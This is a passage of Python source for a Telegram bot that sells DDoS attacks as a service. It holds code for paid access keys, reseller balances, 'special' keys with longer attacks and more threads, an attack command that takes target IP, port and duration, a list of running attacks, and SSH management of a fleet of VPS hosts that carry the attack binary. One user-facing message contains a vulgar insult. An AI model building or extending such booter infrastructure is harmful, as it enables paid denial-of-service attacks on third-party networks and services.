        role_color = "#32CD32"  # Lime Green
    else:
        role = "👤 *User*"
        role_emoji = "👤"
        role_color = "#9370DB"  # Medium Purple

    # Get current time with emoji
    current_time = datetime.now().strftime("%H:%M")
    time_emoji = "🌞" if 6 <= datetime.now().hour < 18 else "🌙"
    
    # Get uptime with animation
    uptime = get_uptime()
    uptime_emoji = "⏳"
    
    # Create stylish ASCII art banner
    banner = r"""
╔════════════════════════════════════╗
║                                    ║
║   🚀 *WELCOME TO THE BOT* 🚀       ║
║                                    ║
╚════════════════════════════════════╝
"""
    
    # Create the welcome message with HTML formatting
    welcome_msg = (
        f"{banner}\n\n"
        f"{role_emoji} Your Role:{role}\n"
        f"🤖 Bot Owner:{escape_markdown(owner_name, version=2)}\n"
        f"{time_emoji} Current Time:{current_time}\n"
        f"{uptime_emoji} Bot Uptime:{uptime}\n\n"
        f"✨ Available Commands:</b>\n"
        f"• /start - Show this message\n"
        f"• Attack - Start DDoS attack\n"
        f"• Redeem Key - Activate your access\n"
        f"• Status - Check your key status\n\n"
        f"Use the buttons below to get started!"
    )
    
    # Use group buttons for everyone
    buttons = group_user_markup
    
    return welcome_msg, buttons

async def set_new_image_url(update: Update, context: CallbackContext):
    """Set the new image URL"""
    new_url = update.message.text.strip()
    
    # Validate URL
    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with http:// or https://")
        return ConversationHandler.END
    
    # Update or add the first image
    if current_images:
        current_images[0]['url'] = new_url
    else:
        current_images.append({'url': new_url, 'caption': ''})
    
    save_image_config()
    
    await update.message.reply_text(
        "✅ Image URL updated successfully!\n"
        f"New URL: {new_url}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def change_group_name(update: Update, context: CallbackContext):
    """Command to change the official group name"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can change the group name!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"⚠️ Current official group name: {OFFICIAL_GROUP_NAME}\n"
        "Enter the new official group name (include @ if it's a username):",
        parse_mode='Markdown'
    )
    return GET_NEW_GROUP_NAME 

async def add_bot_token(update: Update, context: CallbackContext):
    """Get bot token for new instance"""
    token = update.message.text.strip()
    
    # Basic token validation
    if not token or ':' not in token:
        await update.message.reply_text("❌ Invalid bot token format!", parse_mode='Markdown')
        return ConversationHandler.END
    
    context.user_data['new_bot_token'] = token
    
    await update.message.reply_text(
        "⚠️ Enter the owner username for this bot (without @):",
        parse_mode='Markdown'
    )
    return GET_OWNER_USERNAME
    
async def add_owner_username(update: Update, context: CallbackContext):
    """Get owner username and start new bot instance with comprehensive error handling"""
    try:
        owner_username = update.message.text.strip().replace('@', '')
        token = context.user_data['new_bot_token']
        
        if not owner_username:
            await update.message.reply_text("❌ Invalid username!", parse_mode='Markdown')
            return ConversationHandler.END
        
        # Load existing configs
        try:
            configs = load_bot_configs()
            if not isinstance(configs, list):
                logging.error("Invalid bot configs format, resetting to empty list")
                configs = []
        except Exception as e:
            logging.error(f"Error loading bot configs: {e}")
            configs = []
            
        # Validate token
        if ':' not in token:
            await update.message.reply_text("❌ Invalid bot token format!", parse_mode='Markdown')
            return ConversationHandler.END
            
        # Check for duplicate tokens
        if any(c['token'] == token for c in configs):
            await update.message.reply_text("❌ This bot token is already configured!", parse_mode='Markdown')
            return ConversationHandler.END
            
        # Create data directory
        bot_data_dir = os.path.join(BOT_DATA_DIR, f"bot_{len(configs)}")
        try:
            os.makedirs(bot_data_dir, exist_ok=True)
        except Exception as e:
            error_msg = f"❌ Failed to create bot directory: {str(e)}"
            logging.error(error_msg)
            await update.message.reply_text(error_msg, parse_mode='Markdown')
            return ConversationHandler.END
            
        # Start the bot process
        try:
            process = subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve()), "--token", token, "--owner", owner_username],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=bot_data_dir
            )
            
            # Store process info
            process_info = {
                'token': token,
                'owner_username': owner_username,
                'data_dir': bot_data_dir,
                'active': True,
                'pid': process.pid,
                'start_time': int(time.time())
            }
            
            BOT_INSTANCES[token] = process
            configs.append(process_info)
            save_bot_configs(configs)
            
            await update.message.reply_text(
                f"✅ Bot instance started successfully!\n"
                f"Owner: @{owner_username}\n"
                f"PID: {process.pid}",
                parse_mode='Markdown'
            )
            
        except Exception as e:
            error_msg = f"❌ Failed to start bot: {str(e)}"
            logging.error(error_msg)
            await update.message.reply_text(error_msg, parse_mode='Markdown')
            
            # Clean up directory if creation failed
            if os.path.exists(bot_data_dir):
                try:
                    shutil.rmtree(bot_data_dir)
                except Exception as e:
                    logging.error(f"Failed to clean up directory: {e}")
                    
            return ConversationHandler.END
            
    except Exception as e:
        error_msg = f"❌ Unexpected error: {str(e)}"
        logging.error(error_msg, exc_info=True)
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        
    return ConversationHandler.END
    

    
async def delete_binary_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can delete binaries!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ Are you sure you want to delete {BINARY_NAME} from all VPS?\n\n"
        f"Type 'YES' to confirm or anything else to cancel.\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_DELETE

async def delete_binary_confirm(update: Update, context: CallbackContext):
    confirmation = update.message.text.strip().upper()
    
    if confirmation != 'YES':
        await update.message.reply_text("❌ Binary deletion canceled.", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return ConversationHandler.END
    
    message = await update.message.reply_text(
        f"⏳ Starting {BINARY_NAME} binary deletion from all VPS...\n\n",
        parse_mode='Markdown'
    )
    
    success_count = 0
    fail_count = 0
    results = []
    
    for i, vps in enumerate(VPS_LIST):
        ip, username, password = vps
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Define the binary path
            binary_path = f"/home/master/{BINARY_NAME}"
            
            try:
                # Check if binary exists
                stdin, stdout, stderr = ssh.exec_command(f'ls {binary_path} 2>/dev/null || echo "Not found"')
                output = stdout.read().decode().strip()
                
                if output == "Not found":
                    results.append(f"ℹ️ {i+1}. {ip} - Binary not found")
                    continue
                
                # Delete the binary
                ssh.exec_command(f'rm -f {binary_path}')
                
                # Verify deletion
                stdin, stdout, stderr = ssh.exec_command(f'ls {binary_path} 2>/dev/null || echo "Deleted"')
                if "Deleted" not in stdout.read().decode():
                    raise Exception("Deletion verification failed")
                
                results.append(f"✅ {i+1}. {ip} - Successfully deleted")
                success_count += 1
                
            except Exception as e:
                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
                fail_count += 1
            
            ssh.close()
            
        except Exception as e:
            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
            fail_count += 1
    
    # Send results
    result_text = "\n".join(results)
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await message.edit_text(
        f"🗑️ {BINARY_NAME} Binary Deletion Results:\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n\n"
        f"{result_text}\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

    
async def show_running_attacks(update: Update, context: CallbackContext):
    if not running_attacks:
        await update.message.reply_text("ℹ️ No attacks currently running", parse_mode='Markdown')
        return
    
    message = "🔥 *Currently Running Attacks:*\n\n"
    unique_targets = {}  # Track unique targets to avoid duplicates
    
    for attack_id, attack_info in running_attacks.items():
        target = attack_id.split('-')[0]  # Extract IP:Port (assuming format is "IP:PORT-UUID")
        
        # If target already processed, skip
        if target in unique_targets:
            continue
        
        # Store target to avoid duplicates
        unique_targets[target] = True
        
        elapsed = int(time.time() - attack_info['start_time'])
        remaining = max(0, attack_info['duration'] - elapsed)
        
        message += (
            f"🎯 Target: `{target}`\n"
            f"⏱️ Elapsed: `{elapsed}s` | Remaining: `{remaining}s`\n"
            f"🧵 Threads: `{SPECIAL_MAX_THREADS if attack_info['is_special'] else MAX_THREADS}`\n\n"
        )
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def remove_bot_instance(update: Update, context: CallbackContext):
    """Remove a bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can remove bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs)
    )
    
    await update.message.reply_text(
        f"⚠️ Select bot to remove by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP

async def remove_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs.pop(selection)
            save_bot_configs(configs)
            
            # Stop the bot if running
            if config['token'] in BOT_INSTANCES:
                process = BOT_INSTANCES[config['token']]
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                del BOT_INSTANCES[config['token']]
            
            # Remove data directory
            try:
                if os.path.exists(config['data_dir']):
                    import shutil
                    shutil.rmtree(config['data_dir'])
            except Exception as e:
                logging.error(f"Error removing bot data directory: {e}")
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} removed successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def start_selected_bot(update: Update, context: CallbackContext):
    """Start a selected bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can start bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs)
    )
    
    await update.message.reply_text(
        f"⚠️ Select bot to start by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_START

async def start_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs[selection]
            
            if config.get('active'):
                await update.message.reply_text("ℹ️ This bot is already running!", parse_mode='Markdown')
                return ConversationHandler.END
                
            # Start the bot instance
            process = subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve()), "--token", config['token'], "--owner", config['owner_username']],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            BOT_INSTANCES[config['token']] = process
            config['active'] = True
            save_bot_configs(configs)
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} started successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END
    
async def set_group_image_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can set group images!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if update.effective_chat.type not in ['group', 'supergroup']:
        await update.message.reply_text(
            "❌ Please use this command in the group you want to set the image for",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    context.user_data['setting_group_image'] = update.effective_chat.id
    await update.message.reply_text(
        "⚠️ Please send the image you want to use for this group (as a photo)",
        parse_mode='Markdown'
    )
    return GET_NEW_IMAGE_URL

async def set_group_image_url(update: Update, context: CallbackContext):
    if 'setting_group_image' not in context.user_data:
        return ConversationHandler.END
    
    group_id = str(context.user_data['setting_group_image'])
    photo = update.message.photo[-1]  # Get highest resolution photo
    
    # Initialize group image if not exists
    if group_id not in GROUP_IMAGES:
        GROUP_IMAGES[group_id] = {'url': '', 'caption': ''}
    
    # Store file_id and update caption with existing link if available
    GROUP_IMAGES[group_id]['url'] = photo.file_id
    if f'group_{group_id}' in LINKS:
        GROUP_IMAGES[group_id]['caption'] = f"Join our group: {LINKS[f'group_{group_id}']}"
    else:
        GROUP_IMAGES[group_id]['caption'] = "Join our group!"
    
    save_image_config()
    
    await update.message.reply_text(
        "✅ Group image set successfully!\n"
        "You can now set the group link using the '🔗 Set Group Link' button",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )
    return ConversationHandler.END

async def set_group_link_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can set group links!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if update.effective_chat.type not in ['group', 'supergroup']:
        await update.message.reply_text(
            "❌ Please use this command in the group you want to set the link for",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    context.user_data['setting_group_link'] = update.effective_chat.id
    await update.message.reply_text(
        "⚠️ Please send the invite link for this group (should start with https://t.me/)",
        parse_mode='Markdown'
    )
    return GET_GROUP_LINK

async def set_group_link_input(update: Update, context: CallbackContext):
    if 'setting_group_link' not in context.user_data:
        return ConversationHandler.END
    
    group_id = str(context.user_data['setting_group_link'])
    link = update.message.text.strip()
    
    # Validate the link
    if not (link.startswith('https://t.me/') or link.startswith('t.me/')):
        await update.message.reply_text(
            "❌ Invalid Telegram group link! Must start with https://t.me/",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Store the link
    LINKS[f'group_{group_id}'] = link if link.startswith('https://') else f'https://{link}'
    save_links()
    
    # Update the image caption if image exists
    if group_id in GROUP_IMAGES:
        GROUP_IMAGES[group_id]['caption'] = f"Join our group: {LINKS[f'group_{group_id}']}"
        save_image_config()
    
    await update.message.reply_text(
        "✅ Group link set successfully!\n"
        "The image caption has been updated with this link",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )
    return ConversationHandler.END

async def stop_selected_bot(update: Update, context: CallbackContext):
    """Stop a selected bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can stop bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    if not configs:
        await update.message.reply_text("ℹ️ No bot instances configured!", parse_mode='Markdown')
        return
    
    bot_list = "\n".join(
        f"{i}. Owner: @{c['owner_username']} ({'🟢 Running' if c.get('active') else '🔴 Stopped'})"
        for i, c in enumerate(configs))
    
    await update.message.reply_text(
        f"⚠️ Select bot to stop by number:\n\n{bot_list}",
        parse_mode='Markdown'
    )
    return SELECT_BOT_TO_STOP

async def stop_bot_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text)
        configs = load_bot_configs()
        
        if 0 <= selection < len(configs):
            config = configs[selection]
            
            if not config.get('active'):
                await update.message.reply_text("ℹ️ This bot is already stopped!", parse_mode='Markdown')
                return ConversationHandler.END
                
            # Stop the bot instance
            if config['token'] in BOT_INSTANCES:
                process = BOT_INSTANCES[config['token']]
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
                del BOT_INSTANCES[config['token']]
            
            config['active'] = False
            save_bot_configs(configs)
            
            await update.message.reply_text(
                f"✅ Bot instance {selection} stopped successfully!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def show_bot_list_cmd(update: Update, context: CallbackContext):
    """Show list of configured bot instances"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can view bot instances!", parse_mode='Markdown')
        return
    
    configs = load_bot_configs()
    
    if not configs:
        await update.message.reply_text(
            "ℹ️ No bot instances configured yet!",
            parse_mode='Markdown'
        )
        return
    
    message = "📋 Configured Bot Instances:\n\n"
    for i, config in enumerate(configs):
        status = "🟢 Running" if config.get('active', False) else "🔴 Stopped"
        message += (
            f"{i}. Owner: @{config['owner_username']}\n"
            f"   Status: {status}\n"
            f"   Token: `{config['token'][:10]}...`\n"
            f"   Data Dir: `{config.get('data_dir', 'N/A')}`\n\n"
        )
    
    await update.message.reply_text(
        message,
        parse_mode='Markdown'
    )

async def open_bot(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = True
    await update.message.reply_text(
        "✅ *Bot opened! Users can now attack for 120 seconds without keys.*\n"
        f"🔑 *For 200 seconds attacks, keys are still required. Buy from *",
        parse_mode='Markdown'
    )

async def close_bot(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can use this command!*", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = False
    await update.message.reply_text(
        "✅ *Bot closed! Users now need keys for all attacks.*\n",
        parse_mode='Markdown'
    )

async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    user = update.effective_user
    
    # Track interaction
    if 'users_interacted' not in context.bot_data:
        context.bot_data['users_interacted'] = set()
    context.bot_data['users_interacted'].add(user.id)
    
    current_display_name = get_display_name(chat.id if chat.type in ['group', 'supergroup'] else None)
    
    # Create welcome message - now uses group buttons for everyone
    welcome_msg, buttons = create_welcome_message(
        current_display_name,
        is_owner=is_owner(update),
        is_coowner=is_co_owner(update),
        is_reseller=is_reseller(update)
    )

    await update.message.reply_text(
        welcome_msg,
        parse_mode='Markdown',
        reply_markup=buttons
    )
        
async def update_display_name(update: Update, new_name: str):
    """Update the display name with animation effect"""
    message = await update.message.reply_text("🔄 Updating display name...")
    
    # Animation effect
    for i in range(3):
        await asyncio.sleep(0.5)
        await message.edit_text(f"🔄 Updating display name{'...'[:i+1]}")
    
    # Final update
    await message.edit_text(
        f"✅ Display name updated to:\n\n"
        f"✨ *{new_name}* ✨",
        parse_mode='Markdown'
    )

async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Create keyboard for key type selection
    keyboard = [
        [InlineKeyboardButton("Private Key", callback_data='private_key')],
        [InlineKeyboardButton("Group Key", callback_data='group_key')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚠️ *Select key type:*\n\n"
        "🔒 *Private Key* - Can be redeemed in private chat only\n"
        "👥 *Group Key* - Can be redeemed in group chat only",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    return GET_KEY_TYPE

async def generate_key_type(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    key_type = query.data
    context.user_data['key_type'] = key_type  # Store 'private_key' or 'group_key'
    
    await query.edit_message_text(
        f"⚠️ *Enter duration for {'private' if key_type == 'private_key' else 'group'} key (e.g., 1H, 2H, 1D, 2D):*\n\n"
        f"Available formats: {', '.join(KEY_PRICES.keys())}",
        parse_mode='Markdown'
    )
    return GET_DURATION

async def generate_key_duration(update: Update, context: CallbackContext):
    try:
        duration_str = update.message.text.upper()
        key_type = context.user_data.get('key_type', 'group_key')  # Default to group key
        
        if duration_str not in KEY_PRICES:
            await update.message.reply_text(
                "❌ *Invalid duration format!*\n"
                f"Valid formats: {', '.join(KEY_PRICES.keys())}",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        # Calculate expiration time
        if 'H' in duration_str:
            hours = int(duration_str.replace('H', ''))
            expiration_time = time.time() + (hours * 3600)
        elif 'D' in duration_str:
            days = int(duration_str.replace('D', ''))
            expiration_time = time.time() + (days * 86400)
        else:
            await update.message.reply_text("❌ Invalid duration format!", parse_mode='Markdown')
            return ConversationHandler.END
            
        # Generate random key - ensure consistent format
        prefix = "PRIVATE" if key_type == 'private_key' else "GROUP"
        key = f"{prefix}-{duration_str}-{os.urandom(4).hex().upper()}"
        
        # Store key information
        keys[key] = {
            'expiration_time': expiration_time,
            'generated_by': update.effective_user.id,
            'is_private': key_type == 'private_key',
            'generator_name': update.effective_user.full_name
        }
        
        save_keys()
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"🔑 *{'Private' if key_type == 'private_key' else 'Group'} Key Generated!*\n\n"
            f"*Key:* `{key}`\n"
            f"*Duration:* {duration_str}\n"
            f"*Expires:* >{datetime.fromtimestamp(expiration_time).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"👑 *Bot Owner:* {current_display_name}\n\n"
            f"⚠️ *This key can only be redeemed in {'private chat' if key_type == 'private_key' else 'group chat'}*",
            parse_mode='HTML'
        )
        
    except Exception as e:
        logging.error(f"Error generating key: {str(e)}")
        await update.message.reply_text(
            "❌ *Error generating key!*\n"
            f"Error: {str(e)}",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def generate_special_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner, co-owners or resellers can generate special keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):*",
        parse_mode='Markdown'
    )
    return GET_SPECIAL_KEY_DURATION

async def generate_special_key_duration(update: Update, context: CallbackContext):
    try:
        days = int(update.message.text)
        if days <= 0:
            await update.message.reply_text("❌ *Duration must be greater than 0!*", parse_mode='Markdown')
            return ConversationHandler.END
            
        if is_reseller(update):
            user_id = update.effective_user.id
            price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
            if user_id not in reseller_balances or reseller_balances[user_id] < price:
                await update.message.reply_text(
                    f"❌ *Insufficient balance! You need {price} coins to generate this special key.*",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        context.user_data['special_key_days'] = days
        await update.message.reply_text(
            "⚠️ *Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):*",
            parse_mode='Markdown'
        )
        return GET_SPECIAL_KEY_FORMAT
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

async def generate_special_key_format(update: Update, context: CallbackContext):
    custom_format = update.message.text.strip().upper()
    days = context.user_data.get('special_key_days', 30)
    
    if is_reseller(update):
        user_id = update.effective_user.id
        price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
        reseller_balances[user_id] -= price
    
    random_suffix = os.urandom(2).hex().upper()
    key = f"SPECIAL-{custom_format}-{random_suffix}"
    expiration_time = time.time() + (days * 86400)
    
    special_keys[key] = {
        'expiration_time': expiration_time,
        'generated_by': update.effective_user.id
    }
    
    save_keys()
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"💎 *Special Key Generated!*\n\n"
        f"🔑 *Key:* `{key}`\n"
        f"⏳ *Duration:* {days} days\n"
        f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
        f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
        f"👑 *Bot Owner:* PAPA KA BOT\n\n"
        f"⚠️ *This key provides enhanced attack capabilities when you fucking Ritik mommy!*",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def redeem_key_start(update: Update, context: CallbackContext):
    # Check if we're in private chat
    is_private = update.effective_chat.type == "private"
    context.user_data['is_private_redeem'] = is_private
    
    if not is_private and not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id)
    
    await update.message.reply_text(
        "⚠️ *Enter the key to redeem:*\n\n"
        f"🔑 *Buy keys from {current_display_name}*",
        parse_mode='Markdown'
    )
    return GET_KEY
async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text.strip().upper()  # Ensure uppercase for consistency
    user = update.effective_user
    chat = update.effective_chat
    is_private = context.user_data.get('is_private_redeem', False)
    
    current_time = time.time()
    current_display_name = get_display_name(chat.id)

    # Check regular keys first
    if key in keys:
        key_info = keys[key]
        
        # Check if key is expired
        if key_info['expiration_time'] <= current_time:
            del keys[key]
            save_keys()
            await update.message.reply_text(
                f"❌ *This key has expired!*\n\n"
                f"🔑 *Buy fresh keys from {current_display_name}*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        # Verify key type matches chat type
        if key_info['is_private'] and not is_private:
            await update.message.reply_text(
                "❌ *This is a private key and can only be redeemed in private chat!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        if not key_info['is_private'] and is_private:
            await update.message.reply_text(
                "❌ *This is a group key and can only be redeemed in group chat!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        # Redeem the key
        user_id = user.id
        redeemed_users[user_id] = key_info['expiration_time']
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'redeemer_name': user.full_name,
            'generated_by': key_info['generated_by'],
            'generator_name': key_info['generator_name'],
            'is_private': key_info['is_private']
        }
        del keys[key]
        save_keys()
        
        await update.message.reply_text(
            f"✅ *Key redeemed successfully!*\n\n"
            f"*You can now use attack commands until the key expires*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Check special keys
    elif key in special_keys:
        key_info = special_keys[key]
        
        if key_info['expiration_time'] <= current_time:
            del special_keys[key]
            save_keys()
            await update.message.reply_text(
                f"❌ *This special key has expired!*\n\n"
                f"🔑 *Buy fresh keys from {current_display_name}*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        user_id = user.id
        redeemed_users[user_id] = {
            'expiration_time': key_info['expiration_time'],
            'is_special': True
        }
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'redeemer_name': user.full_name,
            'generated_by': key_info['generated_by'],
            'is_special': True
        }
        del special_keys[key]
        save_keys()
        
        await update.message.reply_text(
            f"💎 *Special Key Redeemed!*\n\n"
            f"*You now have enhanced attack capabilities:*\n"
            f"- Max Duration: {SPECIAL_MAX_DURATION} sec\n"
            f"- Max Threads: {SPECIAL_MAX_THREADS}\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Check if key was previously redeemed
    for k, info in redeemed_keys_info.items():
        if k.upper() == key.upper():  # Case-insensitive comparison
            await update.message.reply_text(
                f"❌ *This key was already redeemed by {info['redeemer_name']}!*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    
    # If we get here, key is invalid
    await update.message.reply_text(
        f"❌ *Invalid key!*\n\n"
        f"🔑 *Buy valid keys from {current_display_name}*",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    user = update.effective_user
    
    # Check if we're in private chat and user has private key access
    is_private = chat.type == "private"
    if is_private:
        user_id = user.id
        has_private_access = False
        
        # Check if user has valid private key
        if user_id in redeemed_users:
            if isinstance(redeemed_users[user_id], dict):
                # Special key case
                if redeemed_users[user_id]['expiration_time'] > time.time():
                    has_private_access = True
            else:
                # Regular key case
                if redeemed_users[user_id] > time.time():
                    # Verify this was a private key
                    for key, info in redeemed_keys_info.items():
                        if info['redeemed_by'] == user_id and info.get('is_private', False):
                            has_private_access = True
                            break
        
        if not has_private_access and not is_authorized_user(update):
            current_display_name = get_display_name()
            await update.message.reply_text(
                f"❌ *You need a private key to attack in private chat!*\n\n"
                f"🔑 *Buy private keys from {current_display_name}*",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    
    # For group chats, use existing checks
    elif not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return ConversationHandler.END

    global last_attack_time, global_cooldown

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"❌ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = user.id
    user_has_access = False

    # Check access based on key type and chat type
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            # Special key
            if redeemed_users[user_id]['expiration_time'] > time.time():
                user_has_access = True
        else:
            # Regular key - check if it matches chat type
            if redeemed_users[user_id] > time.time():
                for key, info in redeemed_keys_info.items():
                    if info['redeemed_by'] == user_id:
                        if (is_private and info.get('is_private', False)) or \
                           (not is_private and not info.get('is_private', True)):
                            user_has_access = True
                            break

    if user_has_access or bot_open or is_authorized_user(update):
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            "⚠️ *Enter the attack arguments: <ip> <port> <duration>*\n\n"
            f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
            f"🔑 *Buy keys from {current_display_name}*",
            parse_mode='Markdown'
        )
        return GET_ATTACK_ARGS
    else:
        current_display_name = get_display_name(update.effective_chat.id)
        
